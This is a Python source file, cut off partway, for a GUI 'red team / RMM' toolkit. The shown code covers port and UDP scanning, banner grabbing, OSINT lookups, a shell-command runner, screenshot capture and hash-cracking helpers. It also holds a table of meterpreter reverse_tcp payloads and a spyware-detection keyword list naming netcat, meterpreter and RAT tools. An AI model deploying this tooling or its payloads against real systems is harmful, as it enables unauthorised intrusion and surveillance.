#!/usr/bin/env python3
"""
LOL Tools Enterprise — Red Team / Authorized RMM Suite
Designed strictly for educational demonstrations and authorized network management.
Modern sidebar UI + extended cryptographic / audit / telemetry tooling.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import socket
import threading
import base64
import datetime
import platform
import asyncio
import os
import subprocess
import sys
import re
import pty
import concurrent.futures
import hashlib
import binascii
import html
import urllib.parse
import select
import http.server
import http.client
import socketserver
import json
import time
import queue
import sqlite3
import zlib
import errno

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes, padding, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, ec, padding as rsa_padding
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False

try:
    from telegram import ReplyKeyboardMarkup, KeyboardButton
    from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
    HAS_TELEGRAM = True
except ImportError:
    HAS_TELEGRAM = False

# ───────────────────────────────────────────────────────────────────────
# THEME (Dark Enterprise — GitHub Dark inspired)
# ───────────────────────────────────────────────────────────────────────
BG      = "#0d1117"
BG2     = "#161b22"
BG3     = "#1f2630"
SIDE    = "#010409"
ACCENT  = "#00d4aa"
ACCENT2 = "#58a6ff"
PURPLE  = "#bc8cff"
YELLOW  = "#e3b341"
RED     = "#f85149"
TEXT    = "#c9d1d9"
TDIM    = "#8b949e"
BORDER  = "#30363d"

FONT = "DejaVu Sans"
MONO = "DejaVu Sans Mono"

PAGES = [
    ("🛡️", "Audit",   "_build_audit_page"),
    ("📡", "Telegram", "_build_telegram_page"),
    ("🎛️", "C2",       "_build_c2_page"),
    ("🔐", "Crypto",   "_build_crypto_page"),
    ("💥", "Payload",  "_build_payload_page"),
    ("🔑", "Hashes",   "_build_hash_page"),
    ("🔄", "Decoder",  "_build_decoder_page"),
    ("🌐", "Proxy",    "_build_proxy_page"),
    ("🔁", "Repeater", "_build_repeater_page"),
    ("🌍", "Browser",  "_build_browser_page"),
    ("🗄️", "Ops DB",   "_build_db_page"),
    ("🧪", "Spy Scan", "_build_spy_page"),
]

COMMON_PORTS = {
    20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "TELNET", 25: "SMTP",
    53: "DNS", 67: "DHCP", 68: "DHCP", 69: "TFTP", 80: "HTTP",
    81: "HTTP-ALT", 88: "KERBEROS", 110: "POP3", 111: "RPC", 135: "MSRPC",
    137: "NETBIOS", 139: "NETBIOS", 143: "IMAP", 161: "SNMP", 179: "BGP",
    389: "LDAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS", 514: "SYSLOG",
    587: "SMTP-SUB", 631: "IPP", 636: "LDAPS", 873: "RSYNC", 993: "IMAPS",
    995: "POP3S", 1080: "SOCKS", 1433: "MSSQL", 1521: "ORACLE", 1723: "PPTP",
    2049: "NFS", 2375: "DOCKER", 3000: "GRAFANA", 3128: "SQUID", 3306: "MYSQL",
    3389: "RDP", 5000: "FLASK", 5432: "POSTGRES", 5601: "KIBANA", 5900: "VNC",
    5984: "COUCHDB", 5985: "WINRM", 6379: "REDIS", 8000: "HTTP-ALT", 8080: "HTTP-PROXY",
    8081: "HTTP-ALT", 8443: "HTTPS-ALT", 8888: "HTTP-ALT", 9000: "PHP-FPM",
    9092: "KAFKA", 9200: "ELASTIC", 10000: "WEBMIN", 11211: "MEMCACHED",
    27017: "MONGODB", 50000: "SAP", 50070: "HDFS",
}

PAYLOAD_PLATFORMS = {
    "Windows x64 (.exe)": ("windows/x64/meterpreter/reverse_tcp", "exe", "exe"),
    "Windows x86 (.exe)": ("windows/meterpreter/reverse_tcp", "exe", "exe"),
    "Android (.apk)":     ("android/meterpreter/reverse_tcp", "raw", "apk"),
    "Linux x64 (.elf)":   ("linux/x64/meterpreter/reverse_tcp", "elf", "elf"),
}

CIPHERS = [
    "AES-GCM", "AES-CBC", "AES-CTR", "ChaCha20", "Blowfish", "3DES", "RC4",
    "XOR", "Fernet", "Base64", "Base32", "Base58", "ROT13", "Caesar", "Vigenère",
]

BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

HASH_FUNCS = {
    "MD5":         lambda t: hashlib.md5(t.encode()).hexdigest(),
    "SHA-1":       lambda t: hashlib.sha1(t.encode()).hexdigest(),
    "SHA-224":     lambda t: hashlib.sha224(t.encode()).hexdigest(),
    "SHA-256":     lambda t: hashlib.sha256(t.encode()).hexdigest(),
    "SHA-384":     lambda t: hashlib.sha384(t.encode()).hexdigest(),
    "SHA-512":     lambda t: hashlib.sha512(t.encode()).hexdigest(),
    "SHA3-224":    lambda t: hashlib.sha3_224(t.encode()).hexdigest(),
    "SHA3-256":    lambda t: hashlib.sha3_256(t.encode()).hexdigest(),
    "SHA3-512":    lambda t: hashlib.sha3_512(t.encode()).hexdigest(),
    "RIPEMD160":   lambda t: hashlib.new("ripemd160", t.encode()).hexdigest(),
    "BLAKE2b-256": lambda t: hashlib.blake2b(t.encode(), digest_size=32).hexdigest(),
    "BLAKE2s-256": lambda t: hashlib.blake2s(t.encode(), digest_size=32).hexdigest(),
    "NTLM":        lambda t: hashlib.new("md4", t.encode("utf-16le")).hexdigest(),
    "CRC32":       lambda t: f"{zlib.crc32(t.encode()):08x}",
}

CRACK_FUNCS = {
    "MD5":         lambda w: hashlib.md5(w).hexdigest(),
    "SHA-1":       lambda w: hashlib.sha1(w).hexdigest(),
    "SHA-256":     lambda w: hashlib.sha256(w).hexdigest(),
    "SHA-512":     lambda w: hashlib.sha512(w).hexdigest(),
    "SHA3-256":    lambda w: hashlib.sha3_256(w).hexdigest(),
    "SHA3-512":    lambda w: hashlib.sha3_512(w).hexdigest(),
    "RIPEMD160":   lambda w: hashlib.new("ripemd160", w).hexdigest(),
    "BLAKE2b-256": lambda w: hashlib.blake2b(w, digest_size=32).hexdigest(),
    "NTLM":        lambda w: hashlib.new("md4", w.decode(errors="ignore").encode("utf-16le")).hexdigest(),
    "CRC32":       lambda w: f"{zlib.crc32(w):08x}",
}

HASH_LEN = {
    "MD5": 32, "SHA-1": 40, "SHA-224": 56, "SHA-256": 64, "SHA-384": 96,
    "SHA-512": 128, "SHA3-256": 64, "SHA3-512": 128, "RIPEMD160": 40,
    "BLAKE2b-256": 64, "NTLM": 32, "CRC32": 8,
}

MORSE = {
    "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".", "F": "..-.",
    "G": "--.", "H": "....", "I": "..", "J": ".---", "K": "-.-", "L": ".-..",
    "M": "--", "N": "-.", "O": "---", "P": ".--.", "Q": "--.-", "R": ".-.",
    "S": "...", "T": "-", "U": "..-", "V": "...-", "W": ".--", "X": "-..-",
    "Y": "-.--", "Z": "--..", "0": "-----", "1": ".----", "2": "..---",
    "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...",
    "8": "---..", "9": "----.",
}
MORSE_REV = {v: k for k, v in MORSE.items()}

# ───────────────────────────────────────────────────────────────────────
# OPERATIONS DATABASE (SQLite)
# ───────────────────────────────────────────────────────────────────────
class OperationDB:
    def __init__(self, path=None):
        self.path = path or os.path.join(os.path.expanduser("~"), ".tools1_ops.db")
        self.conn = sqlite3.connect(self.path)
        self.conn.execute("""CREATE TABLE IF NOT EXISTS operations(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, category TEXT, action TEXT, detail TEXT)""")
        self.conn.commit()

    def log(self, category, action, detail=""):
        self.conn.execute("INSERT INTO operations(ts,category,action,detail) VALUES(?,?,?,?)",
            (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), category, action, detail[:400]))
        self.conn.commit()

    def recent(self, limit=500):
        cur = self.conn.execute(
            "SELECT ts,category,action,detail FROM operations ORDER BY id DESC LIMIT ?", (limit,))
        return cur.fetchall()

    def clear(self):
        self.conn.execute("DELETE FROM operations")
        self.conn.commit()

    def count(self):
        return self.conn.execute("SELECT COUNT(*) FROM operations").fetchone()[0]

# ───────────────────────────────────────────────────────────────────────
# SECURITY ENGINE
# ───────────────────────────────────────────────────────────────────────
class SecurityEngine:
    # ── Network Audit ────────────────────────────────────────────────────
    @staticmethod
    def _guess_service(port):
        try:
            return socket.getservbyport(port).upper()
        except Exception:
            return "unknown"

    @staticmethod
    def _probe_os_hint(ip, open_ports):
        hints = []
        try:
            with socket.create_connection((ip, 22), timeout=2) as s:
                s.settimeout(3)
                banner = s.recv(256).decode(errors="ignore")
                low = banner.lower()
                if "ubuntu" in low:
                    hints.append("Linux (Ubuntu)")
                elif "debian" in low:
                    hints.append("Linux (Debian)")
                elif "openssh" in low:
                    hints.append("Unix/Linux (OpenSSH)")
        except Exception:
            pass
        try:
            p = subprocess.run(["ping", "-c", "1", "-W", "2", ip],
                               capture_output=True, text=True, timeout=5)
            m = re.search(r"ttl=(\d+)", p.stdout.lower())
            if m:
                ttl = int(m.group(1))
                if ttl <= 64:
                    hints.append(f"TTL {ttl} → Linux/Unix")
                elif ttl <= 128:
                    hints.append(f"TTL {ttl} → Windows")
                else:
                    hints.append(f"TTL {ttl} → Router/network device")
        except Exception:
            pass
        if 445 in open_ports:
            hints.append("SMB open → likely Windows")
        if 3389 in open_ports:
            hints.append("RDP open → likely Windows")
        return "; ".join(hints) if hints else "No definitive OS signature (filtered)"

    @staticmethod
    def run_full_scan(target, log_callback=None, quick=True, port_range=None, max_threads=256):
        lines = []
        def out(msg):
            lines.append(msg)
            if log_callback:
                log_callback(msg)

        out(f"[~] Launching {'quick' if quick else 'full'} structural analysis on target: {target}")
        try:
            ip = socket.gethostbyname(target)
        except Exception as e:
            out(f"[-] Resolution Failure: {str(e)}")
            return "\n".join(lines)
        out(f"[+] Targeted IP resolved: {ip}")

        if quick:
            ports = sorted(COMMON_PORTS.keys())
        else:
            lo, hi = port_range or (1, 65535)
            ports = list(range(lo, hi + 1))
        total = len(ports)
        out(f"[~] Sweeping {total} ports using {max_threads} concurrent workers...")

        def check(p):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((ip, p)) == 0:
                        return p
            except Exception:
                pass
            return None

        open_ports = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as ex:
            found = 0
            for p in ex.map(check, ports):
                if p is not None:
                    found += 1
                    open_ports.append(p)
                    if found % 25 == 0:
                        out(f"   ...{found} open ports discovered so far")

        open_ports.sort()
        out(f"[+] Scan complete: {len(open_ports)}/{total} ports open")
        for p in open_ports:
            svc = COMMON_PORTS.get(p, SecurityEngine._guess_service(p))
            out(f" [🟢] PORT {p} [{svc}] -> EXPOSED")

        for p in open_ports[:5]:
            try:
                with socket.create_connection((ip, p), timeout=2) as s:
                    s.settimeout(2)
                    b = s.recv(160).decode(errors="ignore").strip()
                    if b:
                        out(f" [📡] BANNER {p}: {b[:90]}")
            except Exception:
                pass

        out(f"[+] OS Signature: {SecurityEngine._probe_os_hint(ip, open_ports)}")
        out("[+] Audit sequence completed.")
        return "\n".join(lines)

    @staticmethod
    def udp_scan(target, log_callback=None):
        lines = []
        def out(msg):
            lines.append(msg)
            if log_callback:
                log_callback(msg)
        try:
            ip = socket.gethostbyname(target)
        except Exception as e:
            return f"[-] Resolution Failure: {e}"
        out(f"[~] UDP probe sweep on {ip} (best-effort: open|filtered detection)")
        udp_ports = [53, 67, 68, 69, 123, 137, 138, 161, 500, 1434, 1900, 4500, 5353]
        results = []
        def check(port):
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1.2)
                s.sendto(b"\x00\x00\x00\x00", (ip, port))
                try:
                    s.recvfrom(1024)
                    return port, "OPEN (response)"
                except socket.timeout:
                    return port, "open|filtered"
            except socket.error as e:
                if e.errno == errno.ECONNREFUSED:
                    return None
                return None
            finally:
                try:
                    if s:
                        s.close()
                except Exception:
                    pass
        for r in [check(p) for p in udp_ports]:
            if r:
                results.append(r)
        if not results:
            out("[-] No UDP responses — most ports filtered (normal for most hosts).")
        for p, state in results:
            out(f" [🟡] UDP {p} [{COMMON_PORTS.get(p, '?')}] -> {state}")
        out("[+] UDP sweep complete.")
        return "\n".join(lines)

    @staticmethod
    def osint_lookup(target):
        lines = [f"[~] OSINT enumeration for {target}"]
        try:
            ip = socket.gethostbyname(target)
        except Exception:
            ip = target
        lines.append(f"[+] IP: {ip}")
        try:
            host, _, _ = socket.gethostbyaddr(ip)
            lines.append(f"[+] Reverse DNS: {host}")
        except Exception:
            lines.append("[~] No reverse DNS record")
        if HAS_REQUESTS:
            try:
                r = requests.get(f"http://ip-api.com/json/{ip}", timeout=6)
                d = r.json()
                if d.get("status") == "success":
                    lines.append(f"[+] Geo: {d.get('city')}, {d.get('regionName')}, {d.get('country')} "
                                 f"({d.get('lat')},{d.get('lon')}) | ISP: {d.get('isp')} | ASN: {d.get('as')}")
            except Exception:
                lines.append("[~] Geo-IP lookup failed")
        try:
            w = subprocess.run(["whois", target], capture_output=True, text=True, timeout=12)
            out = w.stdout
            for kw in ("OrgName", "org-name", "netname", "CIDR", "NetRange", "Country",
                       "descr", "Registrant Organization", "registrar"):
                m = re.search(rf"(?m)^{kw}:\s*(.+)$", out)
                if m:
                    lines.append(f"[+] {kw}: {m.group(1).strip()}")
        except Exception as e:
            lines.append(f"[~] whois unavailable: {e}")
        return "\n".join(lines)

    @staticmethod
    def export_html(text, title, path):
        esc = html.escape(text)
        content = (
            "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>" + html.escape(title) + "</title>"
            "<style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px}"
            "h1{color:#00d4aa}pre{white-space:pre-wrap;background:#161b22;padding:15px;"
            "border:1px solid #30363d;border-radius:8px}</style></head>"
            "<body><h1>" + html.escape(title) + "</h1><pre>" + esc + "</pre></body></html>"
        )
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        return path

    # ── System Telemetry ─────────────────────────────────────────────────
    @staticmethod
    def _format_bytes(n):
        for unit in ("B", "KB", "MB", "GB", "TB"):
            if n < 1024 or unit == "TB":
                return f"{n:.1f} {unit}"
            n /= 1024
        return f"{n:.1f} TB"

    @staticmethod
    def get_system_telemetry():
        lines = ["⚙️ [Node System Telemetry Data]"]
        lines.append(f"• Host Node Tag:  {platform.node()}")
        lines.append(f"• Architecture:   {platform.machine()}")
        lines.append(f"• OS:             {platform.system()} {platform.release()}")
        lines.append(f"• Python:         {platform.python_version()}")
        if not HAS_PSUTIL:
            lines.append("• psutil not installed — extended metrics unavailable")
            return "\n".join(lines)
        cpu = psutil.cpu_percent(interval=0.6)
        lines.append(f"• CPU:            {cpu}%  ({psutil.cpu_count(logical=True)} logical cores)")
        mem = psutil.virtual_memory()
        lines.append(f"• RAM:            {SecurityEngine._format_bytes(mem.used)} / "
                     f"{SecurityEngine._format_bytes(mem.total)}  ({mem.percent}%)")
        disk = psutil.disk_usage("/")
        lines.append(f"• Disk:           {SecurityEngine._format_bytes(disk.used)} / "
                     f"{SecurityEngine._format_bytes(disk.total)}  ({disk.percent}%)")
        net = psutil.net_io_counters()
        lines.append(f"• Network I/O:    ↑ {SecurityEngine._format_bytes(net.bytes_sent)}  "
                     f"↓ {SecurityEngine._format_bytes(net.bytes_recv)}")
        try:
            booted = datetime.datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.datetime.now() - booted
            lines.append(f"• Uptime:         {uptime.days}d {uptime.seconds // 3600}h "
                         f"{(uptime.seconds % 3600) // 60}m")
        except Exception:
            pass
        addrs = psutil.net_if_addrs()
        ip_list = []
        for _, data in addrs.items():
            for a in data:
                if a.family == socket.AF_INET and not a.address.startswith("127."):
                    ip_list.append(a.address)
        if ip_list:
            lines.append(f"• IP Addresses:   {', '.join(sorted(set(ip_list)))}")
        return "\n".join(lines)

    @staticmethod
    def get_network_interfaces():
        if not HAS_PSUTIL:
            return "psutil not installed"
        lines = ["🌐 [Network Interfaces]"]
        addrs = psutil.net_if_addrs()
        for name, data in addrs.items():
            for a in data:
                if a.family == socket.AF_INET:
                    lines.append(f"• {name}: {a.address}  (netmask {a.netmask})")
        return "\n".join(lines)

    @staticmethod
    def list_top_processes(n=12):
        if not HAS_PSUTIL:
            return "psutil not installed — cannot list processes"
        try:
            procs = []
            for p in psutil.process_iter(["name", "pid", "cpu_percent", "memory_percent"]):
                try:
                    info = p.info
                    info["cpu_percent"] = info["cpu_percent"] or 0
                    procs.append(info)
                except Exception:
                    pass
            procs.sort(key=lambda x: (x["cpu_percent"], x["memory_percent"]), reverse=True)
            lines = [f"🖥 [Top {n} Processes by CPU]"]
            for p in procs[:n]:
                lines.append(f"  {p['cpu_percent']:>5.1f}% CPU  {p['memory_percent']:>5.1f}% MEM  "
                             f"PID {p['pid']:<6} {p['name']}")
            return "\n".join(lines)
        except Exception as e:
            return f"Error reading processes: {e}"

    @staticmethod
    def run_shell_command(cmd, timeout=30):
        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            out = proc.stdout.strip() or proc.stderr.strip() or f"[exit code {proc.returncode}]"
            return f"$ {cmd}\n{out}"
        except subprocess.TimeoutExpired:
            return f"$ {cmd}\n[!] Command timed out ({timeout}s)"
        except Exception as e:
            return f"$ {cmd}\n[!] Error: {e}"

    # ── Remote File Management ───────────────────────────────────────────
    @staticmethod
    # ── Local screen capture (RMM feature) ──────────────────────────────
    @staticmethod
    def take_screenshot(path):
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            img.save(path, "PNG")
            if os.path.isfile(path) and os.path.getsize(path) > 0:
                return path
        except Exception:
            pass
        try:
            p = subprocess.run(["import", "-window", "root", path],
                               capture_output=True, timeout=10)
            if p.returncode == 0 and os.path.isfile(path) and os.path.getsize(path) > 0:
                return path
        except Exception:
            pass
        try:
            p = subprocess.run(["gnome-screenshot", "-f", path],
                               capture_output=True, timeout=10)
            if p.returncode == 0 and os.path.isfile(path) and os.path.getsize(path) > 0:
                return path
        except Exception:
            pass
        return None

    # ── Defensive: local spyware / surveillance scan ─────────────────
    @staticmethod
    def local_spy_scan():
        findings = []
        suspicious_names = [
            "keylogger", "xinput", "logkeys", "pam-keylogger", "lynis",
            "spyder", "remmina", "teamviewer", "anydesk", "vnc", "screenshare",
            "realshell", "reverse", "shell", "msfvenom", "meterpreter", "stager",
            "beacon", "cobalt", "empire", "dnscat", "netcat", "ncat", "socat",
            "r74n", "rat", "njrat", "quasar", "asyncrat", "darkrat", "hVNC",
        ]
        try:
            out = subprocess.run(["ps", "-eo", "comm"], capture_output=True, text=True, timeout=10).stdout
            procs = {p.strip() for p in out.splitlines() if p.strip()}
            for name in sorted(procs):
                low = name.lower()
                for kw in suspicious_names:
                    if kw in low:
                        findings.append(f"[!] Suspicious process: {name} (match: {kw})")
                        break
        except Exception as e:
            findings.append(f"[-] process scan error: {e}")

        for var in ("LD_PRELOAD", "LD_AUDIT", "LD_DEBUG_OUTPUT", "BASH_ENV", "ENV"):
            val = os.environ.get(var)
            if val:
                findings.append(f"[!] Injection env var {var}={val}")

        try:
            crontab = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=10).stdout
            for line in crontab.splitlines():
                s = line.strip()
                if s and not s.startswith("#"):
                    findings.append(f"[i] Cron entry: {s[:120]}")
        except Exception:
            pass
        for f in ("/etc/ld.so.preload",):
            try:
                if os.path.isfile(f):
                    data = open(f).read().strip()
                    if data:
                        findings.append(f"[!] {f}: {data[:200]}")
            except Exception:
                pass

        try:
            users = subprocess.run(["getent", "passwd"], capture_output=True, text=True, timeout=10).stdout
            for line in users.splitlines():
                parts = line.split(":")
                if len(parts) >= 7 and parts[6] not in ("/bin/false", "/usr/sbin/nologin", "/sbin/nologin"):
                    if parts[2] not in ("0",):
                        pass
                if len(parts) >= 3 and parts[2] == "0":
                    findings.append(f"[!] Root-privileged account: {parts[0]} (uid 0)")
        except Exception:
            pass

        for dev, label in (("/dev/video0", "camera"), ("/dev/snd/pcmC0D0c", "microphone")):
            try:
                if os.path.exists(dev):
                    busy = subprocess.run(["fuser", dev], capture_output=True, text=True, timeout=10).stdout.strip()
                    if busy:
                        findings.append(f"[!] {label} ({dev}) in use by PIDs: {busy}")
                    else:
                        findings.append(f"[i] {label} ({dev}) idle")
            except Exception:
                pass

        try:
            con = subprocess.run(["ss", "-tunap"], capture_output=True, text=True, timeout=10).stdout
            lines = [l for l in con.splitlines() if "ESTAB" in l or "LISTEN" in l][:30]
            for l in lines:
                findings.append(f"[i] {l.strip()[:130]}")
        except Exception:
            pass

        findings.append("[=] Local surveillance scan complete.")
        return "\n".join(findings)

    # ── Defensive: static APK spyware analysis ───────────────────────
    @staticmethod
    def analyze_apk(path):
        risk = []
        info = []
        try:
            import zipfile
            z = zipfile.ZipFile(path)
        except Exception as e:
            return f"[-] Cannot open APK: {e}"
        names = z.namelist()
        pkg = None
        perms = set()
        activities = set()
        services = set()
        receivers = set()

        if HAS_AAPT := True:
            try:
                out = subprocess.run(["aapt", "dump", "badging", path],
                                     capture_output=True, text=True, timeout=60).stdout
                for line in out.splitlines():
                    if line.startswith("package:"):
                        m = __import__("re").search(r"name='([^']+)'", line)
                        if m:
                            pkg = m.group(1)
                    if line.startswith("uses-permission:"):
                        m = __import__("re").search(r"name='([^']+)'", line)
                        if m:
                            perms.add(m.group(1))
                    if line.startswith("launchable-activity:"):
                        m = __import__("re").search(r"name='([^']+)'", line)
                        if m:
                            activities.add(m.group(1))
            except Exception as e:
                info.append(f"[-] aapt badging: {e}")
            try:
                out = subprocess.run(["aapt", "dump", "xmltree", path, "AndroidManifest.xml"],
                                     capture_output=True, text=True, timeout=60).stdout
                low = out.lower()
                if "accessibilityservice" in low or "android.accessibilityservice" in low:
                    risk.append("[!] Declares an AccessibilityService (screen capture / key injection risk)")
                if "system_alert_window" in low:
                    risk.append("[!] Declares SYSTEM_ALERT_WINDOW (overlay / credential phishing risk)")
                if "receive_boot_completed" in low:
                    risk.append("[i] Auto-starts on boot (BOOT_COMPLETED)")
                if "device_admin" in low or "deviceadmin" in low:
                    risk.append("[!] Requests Device Admin (persistence / lock-screen abuse)")
                if "receive_sms" in low:
                    risk.append("[!] Reads/SMS receiver — steals OTP/2FA codes")
                if "foreground_service" in low:
                    risk.append("[i] Uses a foreground service (persistent background task)")
                for m in __import__("re").finditer(r'(?:E|A) "([a-zA-Z0-9_.]+)"', out):
                    tok = m.group(1)
                    if tok.startswith("com.") and "." in tok[4:]:
                        services.add(tok)
            except Exception as e:
                info.append(f"[-] aapt xmltree: {e}")

        perms = {p for p in perms if p.startswith("android.permission.")}
        if not perms:
            try:
                raw_m = z.read("AndroidManifest.xml")
                for pm in __import__("re").finditer(rb"android\.permission\.([A-Z0-9_]+)", raw_m):
                    perms.add("android.permission." + pm.group(1).decode())
            except Exception:
                pass

        HIGH = {"CAMERA", "RECORD_AUDIO", "RECORD_SCREEN", "READ_SMS", "RECEIVE_SMS",
                "READ_CONTACTS", "READ_CALL_LOG", "READ_PHONE_NUMBERS", "READ_EXTERNAL_STORAGE",
                "ACCESS_FINE_LOCATION", "ACCESS_BACKGROUND_LOCATION", "SYSTEM_ALERT_WINDOW",
                "BIND_ACCESSIBILITY_SERVICE", "REQUEST_INSTALL_PACKAGES", "MANAGE_EXTERNAL_STORAGE"}
        MED = {"VIBRATE", "ACCESS_NETWORK_STATE", "WAKE_LOCK", "INTERNET", "FOREGROUND_SERVICE"}
        sp = set()
        for p in sorted(perms):
            short = p.replace("android.permission.", "")
            if short in HIGH:
                sp.add(short)
        if "CAMERA" in sp:
            risk.append("[!] CAMERA permission — can capture front/back camera")
        if "RECORD_AUDIO" in sp:
            risk.append("[!] RECORD_AUDIO permission — can record microphone")
        if "RECORD_SCREEN" in sp or "CAPTURE_VIDEO_OUTPUT" in sp:
            risk.append("[!] Screen/MediaProjection capture permission")
        if "READ_SMS" in sp or "RECEIVE_SMS" in sp:
            risk.append("[!] SMS access — OTP/2FA interception risk")
        if "SYSTEM_ALERT_WINDOW" in sp:
            risk.append("[!] Overlay permission — can draw fake UI over apps")
        if "BIND_ACCESSIBILITY_SERVICE" in sp:
            risk.append("[!] Accessibility binding — can read screen content and inject taps")
        if "ACCESS_FINE_LOCATION" in sp or "ACCESS_BACKGROUND_LOCATION" in sp:
            risk.append("[!] Precise location tracking")
        if "READ_CONTACTS" in sp or "READ_CALL_LOG" in sp or "READ_PHONE_NUMBERS" in sp:
            risk.append("[!] Reads contacts / call logs / phone numbers")
        if "MANAGE_EXTERNAL_STORAGE" in sp:
            risk.append("[!] All-files access (MANAGE_EXTERNAL_STORAGE)")

        raw = b""
        for n in names:
            low_n = n.lower()
            if "telegram" in low_n or "tgnet" in low_n:
                risk.append(f"[!] Contains Telegram networking library ({n}) — covert C2 channel")
            if n.endswith(".dex"):
                try:
                    raw += z.read(n)[:8000]
                except Exception:
                    pass
        blob = raw.lower()
        for key in (b"org.telegram", b"tgnet", b"bot token", b"api.telegram.org", b"getupdates"):
            if key in blob:
                risk.append(f"[!] Telegram bot artifacts in dex ({key.decode()})")
        for key in (b"webcam", b"camera", b"recordaudio", b"audioflinger", b"MediaRecorder",
                    b"accessibility", b"overlay", b"keylogger"):
            if key in blob:
                info.append(f"[i] dex contains '{key.decode()}'")

        lines = ["════════════ DEFENSIVE APK ANALYSIS ════════════",
                 f"File      : {os.path.basename(path)}",
                 f"Size      : {os.path.getsize(path):,} bytes",
                 f"Package   : {pkg or 'unknown'}"]
        if activities:
            lines.append(f"Entry     : {next(iter(activities))}")
        if services:
            svc = next(iter(services), "")
            lines.append(f"Service   : {svc}")
        if receivers:
            lines.append(f"Receivers : {len(receivers)}")

        lines.append("")
        lines.append("── Permissions ──")
        if sp:
            lines.append("  " + ", ".join(sorted(sp)))
        else:
            lines.append("  (none high-risk found)")
        lines.append("")
        lines.append("── Risk Indicators ──")
        lines.extend(risk if risk else ["  (no obvious spyware indicators)"])
        lines.append("")
        score = min(10, len(sp) * 2 + sum(3 for r in risk if r.startswith("[!]")))
        if score >= 7:
            verdict = "HIGH RISK — suspicious surveillance profile"
        elif score >= 4:
            verdict = "MEDIUM RISK — review permissions"
        else:
            verdict = "LOW RISK — looks benign"
        lines.append(f"Risk score : {score}/10  →  {verdict}")
        if info:
            lines.append("")
            lines.extend(info)
        lines.append("")
        lines.append("NOTE: static analysis only. Legit apps (messengers, banking) may\n"
                     "      trigger indicators; review permissions in context.")
        return "\n".join(lines)

    @staticmethod
    def list_directory(path):
        if not os.path.isdir(path):
            return f"Not a directory: {path}"
        items = os.listdir(path)
        lines = [f"📂 {os.path.abspath(path)}  ({len(items)} entries)"]
        for name in sorted(items)[:250]:
            full = os.path.join(path, name)
            if os.path.isdir(full):
                lines.append(f"[DIR]   {name}")
            else:
                try:
                    lines.append(f"[FILE]  {name}  ({SecurityEngine._format_bytes(os.path.getsize(full))})")
                except Exception:
                    lines.append(f"[FILE]  {name}")
        if len(items) > 250:
            lines.append(f"... ({len(items) - 250} more entries)")
        return "\n".join(lines)
    # ── Cryptographic Module ─────────────────────────────────────────────
    @staticmethod
    def _derive_key(key, salt):
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        return kdf.derive(key.encode())

    @staticmethod
    def _aes_encrypt(plain, key):
        salt = os.urandom(16)
        aes_key = SecurityEngine._derive_key(key, salt)
        iv = os.urandom(12)
        encryptor = Cipher(algorithms.AES(aes_key), modes.GCM(iv)).encryptor()
        ct = encryptor.update(plain.encode("utf-8")) + encryptor.finalize()
        payload = salt + iv + encryptor.tag + ct
        return "AES:" + base64.b64encode(payload).decode()

    @staticmethod
    def _aes_decrypt(ciphertext, key):
        raw = base64.b64decode(ciphertext[4:])
        salt, iv, tag, ct = raw[:16], raw[16:28], raw[28:44], raw[44:]
        aes_key = SecurityEngine._derive_key(key, salt)
        decryptor = Cipher(algorithms.AES(aes_key), modes.GCM(iv, tag)).decryptor()
        return (decryptor.update(ct) + decryptor.finalize()).decode("utf-8")

    @staticmethod
    def _aes_cbc_encrypt(plain, key):
        salt = os.urandom(16)
        aes_key = SecurityEngine._derive_key(key, salt)
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded = padder.update(plain.encode("utf-8")) + padder.finalize()
        encryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).encryptor()
        ct = encryptor.update(padded) + encryptor.finalize()
        return "AES-CBC:" + base64.b64encode(salt + iv + ct).decode()

    @staticmethod
    def _aes_cbc_decrypt(ciphertext, key):
        raw = base64.b64decode(ciphertext[8:])
        salt, iv, ct = raw[:16], raw[16:32], raw[32:]
        aes_key = SecurityEngine._derive_key(key, salt)
        decryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).decryptor()
        padded = decryptor.update(ct) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return (unpadder.update(padded) + unpadder.finalize()).decode("utf-8")

    @staticmethod
    def _aes_ctr_encrypt(plain, key):
        salt = os.urandom(16)
        aes_key = SecurityEngine._derive_key(key, salt)
        iv = os.urandom(16)
        encryptor = Cipher(algorithms.AES(aes_key), modes.CTR(iv)).encryptor()
        ct = encryptor.update(plain.encode("utf-8")) + encryptor.finalize()
        return "AES-CTR:" + base64.b64encode(salt + iv + ct).decode()

    @staticmethod
    def _aes_ctr_decrypt(ciphertext, key):
        raw = base64.b64decode(ciphertext[8:])
        salt, iv, ct = raw[:16], raw[16:32], raw[32:]
